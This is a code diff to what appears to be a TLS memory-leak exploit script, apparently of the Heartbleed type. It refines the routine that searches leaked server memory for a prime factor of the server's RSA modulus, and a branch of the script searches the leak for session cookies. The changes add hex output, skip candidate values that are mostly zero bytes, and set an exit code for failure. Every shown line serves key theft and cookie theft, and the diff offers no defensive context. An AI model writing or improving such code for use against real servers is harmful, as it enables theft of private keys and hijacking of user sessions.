@@ -91,7 +91,7 @@ except TLSRemoteAlert as a:
 if find_priv_key:
     if connection.session.serverCertChain:
         pubkey = connection.session.serverCertChain.x509List[0].publicKey
-        print("n = %s, e = %s" % (pubkey.n, pubkey.e))
+        print("n = %s, e = %s" % (hex(pubkey.n), hex(pubkey.e)))
         num_pubkey_bits = numBits(pubkey.n)
         print("pubkey_bits = %i" % num_pubkey_bits)
         prime_len_bytes = (num_pubkey_bits + 15) // 16
@@ -132,11 +132,15 @@ if find_priv_key:
         # targets (FIXME? Probably not worth it, would have
         # to guess word length on big-endian.)
         data = resp[i+prime_len_bytes:i:-1]
+        if data.count(bytearray(1)) >= (prime_len_bytes//2):
+            # unlikely to be private key, so save CPU time by skipping it
+            continue
         data = bytesToNumber(data)
         #if data != 0: print(data)
         if data > 1 and pubkey != None and (pubkey.n % data) == 0:
-            print("Success! p = %i, q = %i" % (data, pubkey.n//data))
+            print("Success! p = %s, q = %s" % (hex(data), hex(pubkey.n//data)))
             sys.exit(0)
+    sys.exit(2)
 elif find_cookie:
     # This is dirt and needs to be cleaned up.
     cookies = [m.start() for m in re.finditer(cookie_val, resp)]
